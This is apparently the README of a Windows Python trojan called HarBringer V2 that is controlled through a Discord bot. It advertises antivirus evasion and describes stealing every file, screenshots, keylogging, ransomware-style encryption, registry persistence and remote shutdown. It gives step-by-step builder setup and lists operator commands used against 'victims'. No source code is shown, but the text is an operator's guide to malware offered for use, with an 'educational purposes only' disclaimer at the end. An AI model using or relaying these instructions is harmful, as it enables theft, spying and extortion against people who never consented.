# HarBringer V2 

This is an Updated Python Trojan from the original Harbringer. Capable of being undetected by most av's 
As on now, 3 out of 40 av's detect the installer. 2 out of 40 detect the payload itself - [here](https://kleenscan.com/scan_result/ecb9c09b72f91fddbb095d1cf93eb644800c3042a492c61a7b07bf8047639526)

## Notes: 

This payload is designed for windows based systems only. Windows 10 and 11. Usage of this software is against the Discord ToS, using it may get you banned. Also for reasons im yet to understand Avast and AVG keep managaing to detect payload. 

## Functionality: 

Basically the original functionality, but with updates and a builder. 
Functions in no real order: 

* Upload everyfile from the victim's computer to a discord server. (Info Stealer)
* Sends screenshots of victims computer. (Spyware)
* Remote shutdown. 
* Keylogging (Spyware)
* System info: CPU, Memory info, Internect info. 
* Self-Destruct (works only when run as a python file - not when an exe). 
* File Encryption (Ransomware attack)
* Hunt specific files from a system and have them uploaded to a discord server. (Info Stealer)
* Persistence - adds itself to windows registry startup. 
* Maps System Directories

## Necessary things: 

To actually create the programs and files, there are a couple prequesites necessities which must be had.  
- Make sure you actually have python, if you dont - download it [here](https://www.python.org/downloads/windows/)
- Clone the repo!
- Run the `module installer.py` file to download all of the necessary modules. 

## Post-Preperation: 

There are a Few things which must be done before the actual payloads can be made:
1. Activate developer mode on Discord: If you need help with this, go [here](https://beebom.com/how-enable-disable-developer-mode-discord/).
2. Make a new server (unless you want others to see the info) and copy the server ID. If you have actually truned on Discord Developer mode, you should be able to right click on the server icon and click on an item of the appearing in a drop down menue called 'copy server id'. Save the id to somewhere you can retrieve later. 
3. Create a Discord bot at the official Discord application maker portal: [here](https://discord.com/developers/applications). Once you have made a new bot, copy the bot token to a place where you can retrieve it later. Make Sure to enable the message prvillege intent setting. 
4. Now invite the bot into your server, make sure to invite it with admin privs.

## Preperation: 

1. Run the builder.py script. 
2. Do as the script asks you and give the bot token and server id where it asks. 
3. Select what you want as the scirpt prompts you, create an payload as an executable, installer etc. 

## Usage:

Once a victim has the paylaod installed on their system, you have these commands to use: 
* `/mass-upload` - starts uploading every viable file on a victims computer to the server. 
* `/screen-update` - sends screenshot of victims screen to the server
* `/quick-info` - gathers info based on ip-api
* `/shutdown` - shutsdown victims computer
* `/keylogger` - starts a keylogger
* `/hunt` - finds specified files you set and if found uploads them, ie: `/hunt example.docx`
* `/kill` - This is a broken feature as of now, I will be patching this. (It is meant to delete itself but it wont work)
* `/system-info` - Shows info about the victims pc.
* `/help` - Brings up a help menue with all the commands and their functions. 
* `/encrypt` - Encrypts a set path of your choosing with a password of your choosing, ie `/encrypt -p 1234 -f "C:\Users\James\Desktop"`
* `decrypt` - Decrypts a set path you has set during encryption using a password you had set during encryption, ie `/decrypt -p 1234 -f "C:\Users\James\Desktop"`
* `/tree` - Maps system Directories of a given path, ie `/tree "C:\"`

## Helping out: 
*If you found this repo useful, give this repo a STAR. This will help grow this repo and given enough stars, upgrades!

## Find a Bug? 

If you have found a bug in the code, use the issue tab above. If you would like to submit a PR with a fix, reference the issue you are fixing. If you are looking for new features, use the suggestion function in the issues tab above to do so. 

## LICENCE: 

This project has been Licenced under the GNU Affero General Public License v3.0. It can be found at [LICENCE]

## Legality:

This was a program designed for educational purposes only. I do not accept any responsiblity for how this software is used.  